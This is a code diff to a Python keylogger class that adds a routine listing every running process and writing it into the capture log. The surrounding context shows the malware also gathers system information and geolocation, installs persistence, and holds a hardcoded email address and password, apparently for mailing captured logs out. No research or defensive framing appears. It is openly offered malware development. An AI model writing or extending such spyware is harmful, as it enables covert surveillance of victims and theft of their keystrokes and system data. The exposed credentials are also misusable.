@@ -24,6 +24,7 @@ import sys
 import zipfile
 
 import requests
+import psutil
 
 class KeyLogger:
     def __init__(self, time_interval=60, email="joemunene984@gmail.com", password="K3YL00G3R"):
@@ -38,7 +39,23 @@ class KeyLogger:
         self.load_or_generate_key()
         self.get_system_info()
         self.get_geolocation()
+        self.get_active_processes()
         self.become_persistent()
+
+    # ... (other methods)
+
+    def get_active_processes(self):
+        try:
+            process_list = []
+            for proc in psutil.process_iter(['pid', 'name']):
+                process_list.append(f"{proc.info['name']} ({proc.info['pid']})")
+            
+            processes = ", ".join(process_list)
+            self.append_to_log(f"\n[+] Active Processes (Startup):\n{processes}\n")
+        except Exception as e:
+            self.append_to_log(f"\n[-] Process Monitor failed: {e}")
+
+    # ... (rest of methods)
 
     # ... (load_or_generate_key, become_persistent, append_to_log, get_system_info remain same) ...
 
